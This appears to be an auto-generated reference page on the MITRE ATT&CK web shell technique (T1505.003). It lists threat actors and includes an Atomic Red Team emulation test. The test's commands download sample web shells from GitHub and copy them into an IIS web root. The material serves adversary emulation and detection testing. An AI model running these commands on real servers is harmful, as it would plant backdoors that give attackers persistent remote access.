
# Web Shell

## Description

### MITRE Description

> Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.

In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (ex: [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).(Citation: Lee 2013) 

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['SYSTEM', 'User']
* Platforms: ['Linux', 'Windows', 'macOS']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1505/003

## Potential Commands

```
xcopy PathToAtomicsFolder\T1505.003\src\ #{web_shell_path}
xcopy #{web_shells} C:\inetpub\wwwroot
```

## Commands Dataset

```
[{'command': 'xcopy #{web_shells} C:\\inetpub\\wwwroot\n',
  'name': None,
  'source': 'atomics/T1505.003/T1505.003.yaml'},
 {'command': 'xcopy PathToAtomicsFolder\\T1505.003\\src\\ #{web_shell_path}\n',
  'name': None,
  'source': 'atomics/T1505.003/T1505.003.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Server Software Component: Web Shell': {'atomic_tests': [{'auto_generated_guid': '0a2ce662-1efa-496f-a472-2fe7b080db16',
                                                                                    'dependencies': [{'description': 'Web '
                                                                                                                     'shell '
                                                                                                                     'must '
                                                                                                                     'exist '
                                                                                                                     'on '
                                                                                                                     'disk '
                                                                                                                     'at '
                                                                                                                     'specified '
                                                                                                                     'location '
                                                                                                                     '(#{web_shells})\n',
                                                                                                      'get_prereq_command': 'New-Item '
                                                                                                                            '-Type '
                                                                                                                            'Directory '
                                                                                                                            '(split-path '
                                                                                                                            '#{web_shells}) '
                                                                                                                            '-ErrorAction '
                                                                                                                            'ignore '
                                                                                                                            '| '
                                                                                                                            'Out-Null\n'
                                                                                                                            'Invoke-WebRequest '
                                                                                                                            '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/b.jsp" '
                                                                                                                            '-OutFile '
                                                                                                                            '"#{web_shells}/b.jsp"\n'
                                                                                                                            'Invoke-WebRequest '
                                                                                                                            '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/tests.jsp" '
                                                                                                                            '-OutFile '
                                                                                                                            '"#{web_shells}/test.jsp"\n'
                                                                                                                            'Invoke-WebRequest '
                                                                                                                            '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/cmd.aspx" '
                                                                                                                            '-OutFile '
                                                                                                                            '"#{web_shells}/cmd.aspx"\n',
                                                                                                      'prereq_command': 'if '
                                                                                                                        '(Test-Path '
                                                                                                                        '#{web_shells}) '
                                                                                                                        '{exit '
                                                                                                                        '0} '
                                                                                                                        'else '
                                                                                                                        '{exit '
                                                                                                                        '1}\n'}],
                                                                                    'dependency_executor_name': 'powershell',
                                                                                    'description': 'This '
                                                                                                   'test '
                                                                                                   'simulates '
                                                                                                   'an '
                                                                                                   'adversary '
                                                                                                   'leveraging '
                                                                                                   'Web '
                                                                                                   'Shells '
                                                                                                   'by '
                                                                                                   'simulating '
                                                                                                   'the '
                                                                                                   'file '
                                                                                                   'modification '
                                                                                                   'to '
                                                                                                   'disk.\n'
                                                                                                   'Idea '
                                                                                                   'from '
                                                                                                   'APTSimulator.\n'
                                                                                                   'cmd.aspx '
                                                                                                   'source '
                                                                                                   '- '
                                                                                                   'https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx\n',
                                                                                    'executor': {'cleanup_command': 'del '
                                                                                                                    '#{web_shell_path} '
                                                                                                                    '/q '
                                                                                                                    '>nul '
                                                                                                                    '2>&1\n',
                                                                                                 'command': 'xcopy '
                                                                                                            '#{web_shells} '
                                                                                                            '#{web_shell_path}\n',
                                                                                                 'name': 'command_prompt'},
                                                                                    'input_arguments': {'web_shell_path': {'default': 'C:\\inetpub\\wwwroot',
                                                                                                                           'description': 'The '
                                                                                                                                          'path '
                                                                                                                                          'to '
                                                                                                                                          'drop '
                                                                                                                                          'the '
                                                                                                                                          'web '
                                                                                                                                          'shell',
                                                                                                                           'type': 'string'},
                                                                                                        'web_shells': {'default': 'PathToAtomicsFolder\\T1505.003\\src\\',
                                                                                                                       'description': 'Path '
                                                                                                                                      'of '
                                                                                                                                      'Web '
                                                                                                                                      'Shell',
                                                                                                                       'type': 'path'}},
                                                                                    'name': 'Web '
                                                                                            'Shell '
                                                                                            'Written '
                                                                                            'to '
                                                                                            'Disk',
                                                                                    'supported_platforms': ['windows']}],
                                                                  'attack_technique': 'T1505.003',
                                                                  'display_name': 'Server '
                                                                                  'Software '
                                                                                  'Component: '
                                                                                  'Web '
                                                                                  'Shell'}}]
```

# Tactics


* [Persistence](../tactics/Persistence.md)


# Mitigations

None

# Actors


* [APT32](../actors/APT32.md)

* [OilRig](../actors/OilRig.md)
    
* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)
    
* [Deep Panda](../actors/Deep-Panda.md)
    
* [APT39](../actors/APT39.md)
    
* [Leviathan](../actors/Leviathan.md)
    
* [TEMP.Veles](../actors/TEMP.Veles.md)
    
* [Threat Group-3390](../actors/Threat-Group-3390.md)
    
* [Soft Cell](../actors/Soft-Cell.md)
    
* [Tropic Trooper](../actors/Tropic-Trooper.md)
    
